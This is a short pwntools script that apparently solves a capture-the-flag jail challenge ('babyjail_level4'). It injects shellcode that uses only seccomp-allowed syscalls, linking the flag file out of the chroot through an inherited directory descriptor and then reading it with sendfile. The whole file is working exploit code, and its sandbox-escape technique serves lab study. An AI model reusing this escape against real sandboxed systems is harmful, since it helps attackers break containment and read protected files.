import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

#     Allowing syscall: openat (number 257).
#     Allowing syscall: read (number 0).
#     Allowing syscall: write (number 1).
#     Allowing syscall: sendfile (number 40).

with pwn.process(["/challenge/babyjail_level4", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""
    {pwn.shellcraft.pushstr("flag")}
    mov rsi, rsp
    {pwn.shellcraft.linkat(3, "rsi", -100, "abc", 0)}

    {pwn.shellcraft.open("/abc", 0)}

    {pwn.shellcraft.sendfile(1, 4, 0, 1024)}
    """))

    pwn.info(target.readrepeat(1))
